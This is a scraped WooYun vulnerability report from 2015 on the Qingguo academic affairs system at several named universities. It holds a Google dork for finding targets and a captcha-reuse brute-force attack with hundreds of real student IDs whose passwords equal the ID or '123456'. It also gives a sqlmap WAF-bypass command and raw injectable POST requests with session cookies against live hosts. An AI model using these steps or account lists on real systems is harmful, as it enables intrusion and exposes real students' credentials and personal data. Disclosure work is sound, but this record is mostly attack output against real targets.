{"id": 45087, "wybug_id": "wooyun-2015-090675", "wybug_title": "青果教务系统多处漏洞可整站脱裤", "wybug_corp": "湖南青果软件有限公司", "wybug_author": "路人甲", "wybug_date": "2015-01-12 15:28", "wybug_open_date": "2015-04-02 10:23", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["安全意识不足", "注射漏洞利用技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-01-12：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-01-17：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-03-13：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-03-23：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-04-02：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-04-02：\t细节向公众公开  简要描述： 绕过WAF 详细说明：  一、验证码可重复利用导致撞库漏洞今年，随着国外Gmail及国内多个大型电商受到撞库攻击，撞库已然成为高危漏洞。通过撞库，黑客可成功窃取大量账户作为进一步攻击的手段，现在全国多个高校在用的青果教务系统验证码未处理导致可重复利用，最终经过一些暴力枚举可获取学生信息谷歌：intitle:\"学生综合管理系统\" inurl:\"xsweb\" 可以获得不少青果管理系统主站登陆处案例1.http://xsweb.uvu.edu.cn/首先通过社工得到学号：http://zhidao.baidu.com/link?url=Yjp5QaLrzSDK9GQUuKROAtvvNH9iRGbqIJ8I7xsfAX0hfyrilWCR2WXsX14deKXmT_iHQggLbBzszA_EeYd9Kq登陆后抓包，设定账户密码都为2013100000-2013100410爆破400+账户发现成功了300\nPayload1        Payload2        Length2013100001      2013100001      108332013100002      2013100002      108332013100003      2013100003      108332013100004      2013100004      108332013100005      2013100005      108332013100006      2013100006      108332013100007      2013100007      108332013100008      2013100008      108332013100009      2013100009      108332013100010      2013100010      108332013100011      2013100011      108332013100012      2013100012      108332013100013      2013100013      108332013100014      2013100014      108332013100015      2013100015      108332013100016      2013100016      108332013100017      2013100017      108332013100018      2013100018      108332013100019      2013100019      108332013100020      2013100020      108332013100021      2013100021      108332013100022      2013100022      108332013100023      2013100023      108332013100024      2013100024      108332013100025      2013100025      108332013100026      2013100026      108332013100027      2013100027      108332013100028      2013100028      108332013100029      2013100029      108332013100031      2013100031      108332013100032      2013100032      108332013100033      2013100033      108332013100034      2013100034      108332013100035      2013100035      108332013100036      2013100036      108332013100037      2013100037      108332013100038      2013100038      108332013100039      2013100039      108332013100040      2013100040      108332013100041      2013100041      108332013100042      2013100042      108332013100043      2013100043      108332013100044      2013100044      108332013100045      2013100045      108332013100046      2013100046      108332013100047      2013100047      108332013100048      2013100048      108332013100051      2013100051      108332013100053      2013100053      108332013100054      2013100054      108332013100061      2013100061      108332013100062      2013100062      108332013100063      2013100063      108332013100064      2013100064      108332013100065      2013100065      108332013100066      2013100066      108332013100067      2013100067      108332013100068      2013100068      108332013100069      2013100069      108332013100070      2013100070      108332013100071      2013100071      108332013100072      2013100072      108332013100073      2013100073      108332013100074      2013100074      108332013100075      2013100075      108332013100076      2013100076      108332013100077      2013100077      108332013100078      2013100078      108332013100079      2013100079      108332013100080      2013100080      108332013100081      2013100081      108332013100082      2013100082      108332013100083      2013100083      108332013100084      2013100084      108332013100085      2013100085      108332013100086      2013100086      108332013100087      2013100087      108332013100088      2013100088      108332013100089      2013100089      108332013100090      2013100090      108332013100091      2013100091      108332013100092      2013100092      108332013100093      2013100093      108332013100094      2013100094      108332013100095      2013100095      108332013100096      2013100096      108332013100097      2013100097      108332013100098      2013100098      108332013100099      2013100099      108332013100100      2013100100      108332013100101      2013100101      108332013100102      2013100102      108332013100103      2013100103      108332013100104      2013100104      108332013100105      2013100105      108332013100106      2013100106      108332013100107      2013100107      108332013100108      2013100108      108332013100109      2013100109      108332013100110      2013100110      108332013100111      2013100111      108332013100112      2013100112      108332013100121      2013100121      108332013100122      2013100122      108332013100123      2013100123      108332013100124      2013100124      108332013100125      2013100125      108332013100126      2013100126      108332013100127      2013100127      108332013100128      2013100128      108332013100129      2013100129      108332013100130      2013100130      108332013100131      2013100131      108332013100132      2013100132      108332013100133      2013100133      108332013100134      2013100134      108332013100135      2013100135      108332013100136      2013100136      108332013100137      2013100137      108332013100138      2013100138      108332013100139      2013100139      108332013100140      2013100140      108332013100141      2013100141      108332013100142      2013100142      108332013100143      2013100143      108332013100144      2013100144      108332013100151      2013100151      108332013100152      2013100152      108332013100153      2013100153      108332013100154      2013100154      108332013100155      2013100155      108332013100156      2013100156      108332013100157      2013100157      108332013100158      2013100158      108332013100159      2013100159      108332013100160      2013100160      108332013100161      2013100161      108332013100162      2013100162      108332013100163      2013100163      108332013100164      2013100164      108332013100165      2013100165      108332013100166      2013100166      108332013100167      2013100167      108332013100168      2013100168      108332013100169      2013100169      108332013100170      2013100170      108332013100171      2013100171      108332013100172      2013100172      108332013100173      2013100173      108332013100174      2013100174      108332013100175      2013100175      108332013100176      2013100176      108332013100177      2013100177      108332013100178      2013100178      108332013100179      2013100179      108332013100180      2013100180      108332013100191      2013100191      108332013100192      2013100192      108332013100193      2013100193      108332013100194      2013100194      108332013100195      2013100195      108332013100196      2013100196      108332013100197      2013100197      108332013100198      2013100198      108332013100199      2013100199      108332013100200      2013100200      108332013100201      2013100201      108332013100202      2013100202      108332013100203      2013100203      108332013100204      2013100204      108332013100205      2013100205      108332013100206      2013100206      108332013100207      2013100207      108332013100208      2013100208      108332013100209      2013100209      108332013100210      2013100210      108332013100211      2013100211      108332013100212      2013100212      108332013100213      2013100213      108332013100214      2013100214      108332013100215      2013100215      108332013100216      2013100216      108332013100217      2013100217      108332013100218      2013100218      108332013100219      2013100219      108332013100220      2013100220      108332013100221      2013100221      108332013100222      2013100222      108332013100231      2013100231      108332013100232      2013100232      108332013100233      2013100233      108332013100234      2013100234      108332013100235      2013100235      108332013100236      2013100236      108332013100237      2013100237      108332013100238      2013100238      108332013100239      2013100239      108332013100240      2013100240      108332013100241      2013100241      108332013100242      2013100242      108332013100243      2013100243      108332013100244      2013100244      108332013100245      2013100245      108332013100246      2013100246      108332013100247      2013100247      108332013100248      2013100248      108332013100249      2013100249      108332013100250      2013100250      108332013100251      2013100251      108332013100252      2013100252      108332013100253      2013100253      108332013100254      2013100254      108332013100255      2013100255      108332013100256      2013100256      108332013100257      2013100257      108332013100258      2013100258      108332013100259      2013100259      108332013100271      2013100271      108332013100272      2013100272      108332013100273      2013100273      108332013100274      2013100274      108332013100275      2013100275      108332013100276      2013100276      108332013100277      2013100277      108332013100278      2013100278      108332013100279      2013100279      108332013100280      2013100280      108332013100281      2013100281      108332013100282      2013100282      108332013100283      2013100283      108332013100284      2013100284      108332013100285      2013100285      108332013100286      2013100286      108332013100287      2013100287      108332013100288      2013100288      108332013100289      2013100289      108332013100290      2013100290      108332013100291      2013100291      108332013100292      2013100292      108332013100293      2013100293      108332013100294      2013100294      108332013100295      2013100295      108332013100296      2013100296      108332013100297      2013100297      108332013100298      2013100298      108332013100311      2013100311      108332013100312      2013100312      108332013100313      2013100313      108332013100314      2013100314      108332013100315      2013100315      108332013100316      2013100316      108332013100317      2013100317      108332013100318      2013100318      108332013100319      2013100319      108332013100320      2013100320      108332013100321      2013100321      108332013100322      2013100322      108332013100323      2013100323      108332013100324      2013100324      108332013100325      2013100325      108332013100326      2013100326      108332013100327      2013100327      108332013100328      2013100328      108332013100329      2013100329      108332013100330      2013100330      108332013100331      2013100331      108332013100332      2013100332      108332013100333      2013100333      108332013100334      2013100334      108332013100335      2013100335      108332013100336      2013100336      108332013100337      2013100337      108332013100338      2013100338      108332013100339      2013100339      108332013100340      2013100340      108332013100351      2013100351      108332013100352      2013100352      108332013100353      2013100353      108332013100354      2013100354      108332013100355      2013100355      108332013100356      2013100356      108332013100357      2013100357      108332013100358      2013100358      108332013100359      2013100359      108332013100360      2013100360      108332013100361      2013100361      108332013100362      2013100362      108332013100363      2013100363      108332013100364      2013100364      108332013100365      2013100365      108332013100366      2013100366      108332013100367      2013100367      108332013100368      2013100368      108332013100369      2013100369      108332013100370      2013100370      108332013100371      2013100371      108332013100372      2013100372      108332013100373      2013100373      108332013100374      2013100374      108332013100375      2013100375      108332013100376      2013100376      108332013100402      2013100402      108332013100405      2013100405      10833\n登陆一个2013100334\n\n还知道他宿舍在哪儿\n\n案例2.http://jw.ynjtc.com/xsweb 密码123456测试即可得160账户\nPayload Length2013880840      139862013880852      139862013880900      139862013880901      139862013880935      139862013880936      139862013880966      139862013881002      139862013881047      139862013881068      139862013881069      139862013881083      139862013881109      139862013881116      139862013881139      139862013881148      139862013881194      139862013881248      139862013881315      139862013881361      139862013881398      139862013881403      139862013881409      139862013881413      139862013881442      139862013881456      139862013881492      139862013881515      139862013881572      139862013881597      139862013881652      139862013881677      139862013881697      139862013881779      139862013881843      139862013881851      139862013881852      139862013881855      139862013881886      139862013881914      139862013881917      139862013881918      139862013881985      139862013881986      139862013881989      139862013882009      139862013882013      139862013882014      139862013882055      139862013882168      139862013882191      139862013882213      139862013882237      139862013882284      139862013882332      139862013882366      139862013882402      139862013882520      139862013882540      139862013882549      139862013882605      139862013882609      139862013882625      139862013882643      139862013882652      139862013882655      139862013882668      139862013882670      139862013882677      139862013882685      139862013882697      139862013882699      139862013882700      139862013882715      139862013882746      139862013882785      139862013882790      139862013882805      139862013882819      139862013882839      139862013882846      139862013882853      139862013882874      139862013882878      139862013882882      139862013882884      139862013882889      139862013882902      139862013882919      139862013882930      139862013882972      139862013882985      139862013882997      139862013883004      139862013883009      139862013883012      139862013883013      139862013883046      139862013883048      139862013883076      139862013883132      139862013883137      139862013883149      139862013883157      139862013883165      139862013883185      139862013883192      139862013883196      139862013883207      139862013883265      139862013883287      139862013883301      139862013883363      139862013883364      139862013883391      139862013883394      139862013883429      139862013883450      139862013883502      139862013883508      139862013883550      139862013883582      139862013883586      139862013883607      139862013883608      139862013883627      139862013883650      139862013883671      139862013883738      139862013883745      139862013883749      139862013883754      139862013883756      139862013883757      139862013883758      139862013883763      139862013883772      139862013883810      139862013883824      139862013883827      139862013883934      139862013883935      139862013883936      139862013883937      139862013883950      139862013883970      139862013883980      139862013884010      139862013884012      139862013884026      139862013884060      139862013884080      139862013884083      139862013884159      139862013884160      139862013884177      13986\n账户密码相同的也有22个\nPayload1        Payload2        Length2013881377      2013881377      139862013881406      2013881406      139862013881568      2013881568      139862013881751      2013881751      139862013882079      2013882079      139862013882313      2013882313      139862013882381      2013882381      139862013882563      2013882563      139862013882593      2013882593      139862013882999      2013882999      139862013883197      2013883197      139862013883223      2013883223      139862013883464      2013883464      139862013883599      2013883599      139862013883652      2013883652      139862013883751      2013883751      139862013883798      2013883798      139862013883971      2013883971      139862013883975      2013883975      139862013884030      2013884030      139862013884184      2013884184      13986\n\n\n案例3.http://219.228.48.108:81/xsweb/扫110201000-110201999 1000账户中账户密码相同的有100+\nPayload1        Payload2        Length110201102       110201102       10877110201103       110201103       10877110201104       110201104       10877110201105       110201105       10877110201106       110201106       10877110201107       110201107       10877110201108       110201108       10877110201109       110201109       10877110201110       110201110       10877110201111       110201111       10877110201112       110201112       10877110201113       110201113       10877110201114       110201114       10877110201115       110201115       10877110201116       110201116       10877110201117       110201117       10877110201118       110201118       10877110201119       110201119       10877110201120       110201120       10877110201121       110201121       10877110201122       110201122       10877110201123       110201123       10877110201124       110201124       10877110201125       110201125       10877110201126       110201126       10877110201127       110201127       10877110201128       110201128       10877110201129       110201129       10877110201130       110201130       10877110201131       110201131       10877110201132       110201132       10877110201133       110201133       10877110201134       110201134       10877110201135       110201135       10877110201136       110201136       10877110201137       110201137       10877110201138       110201138       10877110201139       110201139       10877110201140       110201140       10877110201141       110201141       10877110201142       110201142       10877110201143       110201143       10877110201144       110201144       10877110201145       110201145       10877110201146       110201146       10877110201147       110201147       10877110201148       110201148       10877110201149       110201149       10877110201150       110201150       10877110201151       110201151       10877110201152       110201152       10877110201153       110201153       10877110201154       110201154       10877110201155       110201155       10877110201156       110201156       10877110201157       110201157       10877110201158       110201158       10877110201201       110201201       10877110201202       110201202       10877110201203       110201203       10877110201204       110201204       10877110201205       110201205       10877110201206       110201206       10877110201207       110201207       10877110201208       110201208       10877110201209       110201209       10877110201210       110201210       10877110201211       110201211       10877110201212       110201212       10877110201213       110201213       10877110201214       110201214       10877110201215       110201215       10877110201216       110201216       10877110201217       110201217       10877110201218       110201218       10877110201219       110201219       10877110201220       110201220       10877110201221       110201221       10877110201222       110201222       10877110201223       110201223       10877110201224       110201224       10877110201225       110201225       10877110201226       110201226       10877110201227       110201227       10877110201228       110201228       10877110201229       110201229       10877110201230       110201230       10877110201231       110201231       10877110201232       110201232       10877110201233       110201233       10877110201234       110201234       10877110201235       110201235       10877110201236       110201236       10877110201237       110201237       10877110201238       110201238       10877110201239       110201239       10877110201240       110201240       10877110201241       110201241       10877110201242       110201242       10877110201243       110201243       10877110201244       110201244       10877110201245       110201245       10877110201246       110201246       10877110201247       110201247       10877110201248       110201248       10877110201249       110201249       10877110201250       110201250       10877110201251       110201251       10877110201252       110201252       10877110201253       110201253       10877110201254       110201254       10877110201255       110201255       10877110201256       110201256       10877\n案例4.http://121.8.99.242/xsweb\n\n二、SQL注入漏洞[WAF绕过方法：--tamper \"equaltolike.py\"]0x00 注入点1:\n\n1.http://xsweb.uvu.edu.cn/default.aspx点击上面检索后抓包类似如下：使用python sqlmap.py -r 1.txt --tamper \"equaltolike.py\" --is-dba --dbs 即可绕过WAF\nPOST /TZJK/ViewHabitusHealthStandard_rpt.aspx HTTP/1.1Accept: text/html, application/xhtml+xml, */*Referer: http://xsweb.uvu.edu.cn/TZJK/ViewHabitusHealthStandard.aspxAccept-Language: zh-Hans-CN,zh-Hans;q=0.8,en-US;q=0.5,en;q=0.3User-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0; MALCJS)Content-Type: application/x-www-form-urlencodedAccept-Encoding: gzip, deflateProxy-Connection: Keep-AliveContent-Length: 12DNT: 1Host: xsweb.uvu.edu.cnPragma: no-cacheCookie: safedog-flow-item=784D7EA494F6B01DC142459982879EC4; ASP.NET_SessionId=yb00m5a42vv3uorfpfzbvzy2type=1&sex=1*\n\n\n2.http://jw.ynjtc.com/xsweb\n\n3.http://219.228.48.108:81/xsweb/\n\n0x01 注入点2：\n\nhttp://219.228.48.108:81抓包类似如下：\nPOST /xsweb/TZJK/ViewHabitusHealthEducationPlan_rpt.aspx HTTP/1.1Accept: text/html, application/xhtml+xml, */*Referer: http://219.228.48.108:81/xsweb/TZJK/ViewHabitusHealthEducationPlan.aspxAccept-Language: zh-Hans-CN,zh-Hans;q=0.8,en-US;q=0.5,en;q=0.3User-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0; MALCJS)Content-Type: application/x-www-form-urlencodedAccept-Encoding: gzip, deflateProxy-Connection: Keep-AliveContent-Length: 12DNT: 1Host: 219.228.48.108:81Pragma: no-cacheCookie: ASP.NET_SessionId=exdzo445xffrfqqfssmmyoupxn=2012&xq=0*\n\n\n0x02 注入点3\n\n\n\n0x03 注入点4\n\n\n\n0x04 注入点5、6、7、8\n\n\n\n\n\n\n\n0x05 注入点9、10【抓包加'没回显的注入】\n\n\nPOST /xsweb/SXZZ/ViewMGActivity_rpt.aspx HTTP/1.1Accept: text/html, application/xhtml+xml, */*Referer: http://219.228.48.108:81/xsweb/SXZZ/ViewMGActivity.aspxAccept-Language: zh-Hans-CN,zh-Hans;q=0.8,en-US;q=0.5,en;q=0.3User-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0; MALCJS)Content-Type: application/x-www-form-urlencodedAccept-Encoding: gzip, deflateProxy-Connection: Keep-AliveContent-Length: 16DNT: 1Host: 219.228.48.108:81Pragma: no-cacheCookie: ASP.NET_SessionId=exdzo445xffrfqqfssmmyoupsel_xn=2012*&xq=0\n\n\n\n\n\nPOST /xsweb/SXZZ/ViewWinActivity_rpt.aspx HTTP/1.1Accept: text/html, application/xhtml+xml, */*Referer: http://219.228.48.108:81/xsweb/SXZZ/ViewWinActivity.aspxAccept-Language: zh-Hans-CN,zh-Hans;q=0.8,en-US;q=0.5,en;q=0.3User-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0; MALCJS)Content-Type: application/x-www-form-urlencodedAccept-Encoding: gzip, deflateProxy-Connection: Keep-AliveContent-Length: 16DNT: 1Host: 219.228.48.108:81Pragma: no-cacheCookie: ASP.NET_SessionId=exdzo445xffrfqqfssmmyoupsel_xn=2012&xq=0\n\n\n   漏洞证明：  见详细   修复方案：  过滤敏感字符   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-04-02 10:23 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-01-12 16:54 |    \t\tkv2 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:3        | 技术的精纯以及无私的奉献是我们至高无上的...)\t\t \n  不愿意透露姓名的路人甲    \n     2015-01-12 18:01 |    \t\tACE \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 我是小菜，不熟悉sql注入，不擅长xss，不精...)\t\t \n  我什么时候才能从路人变到“路人甲”，强势关注    \n     2015-01-15 01:42 |    \t\tevil \t\t\t( 实习白帽子  |\t\t\t        Rank:41 漏洞数:21        )\t\t \n  mark    \n     2015-02-03 17:43 |    \t\tx7iao \t\t\t( 普通白帽子  |\t\t\t        Rank:348 漏洞数:41        | 文能床上控萝莉，武能床上定人妻)\t\t \n  mark    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}